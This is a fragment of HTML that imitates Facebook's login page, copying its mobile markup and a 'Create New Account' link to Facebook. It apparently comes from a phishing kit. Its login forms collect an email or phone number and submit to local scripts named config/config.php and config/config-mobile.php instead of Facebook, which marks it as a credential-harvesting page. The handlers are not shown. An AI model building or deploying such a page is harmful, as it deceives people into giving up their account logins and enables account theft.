                                                ...
                                                <div class="bk">
                                                    <form action="config/config-mobile.php">
                                                        <ul class="bn bo bp">
                                                            ...
                                                            <li class="bo"><input value="Log In" type="submit" name="login" class="m s n bx by bz" /></li>
                                                            <li class="bo"></li>
                                                        </ul>
                                                        <div>
                                                            <div id="login_reg_separator" class="ca"><span class="cb">or</span></div>
                                                            <div class="cc cd" id="signup_button_area">
                                                                <div class="cc ce cf" id="signup-button" tabindex="0">
                                                                    <!-- <input href="https://mbasic.facebook.com/reg" value="Create New Account" type="submit" class="m s n cg by ch" /> -->
                                                                    <a href="https://mbasic.facebook.com/reg" type="submit" name="sign_up" class="creat-btn m s n cg by ch">Create New Account</a>
                                                                </div>                                                            </div>
                                                        </div>
                                                        <input type="hidden" name="bi_xrwh" value="0" /><input type="hidden" id="scetoggle" />
                                                        <div></div>
					...
					<div class="content-right">
						<form action="config/config.php">
							<div class="form-group">
								<input type="text" name="email"  autocomplete="off" required placeholder="Email address or phone number">
							</div>
							<div class="form-group">
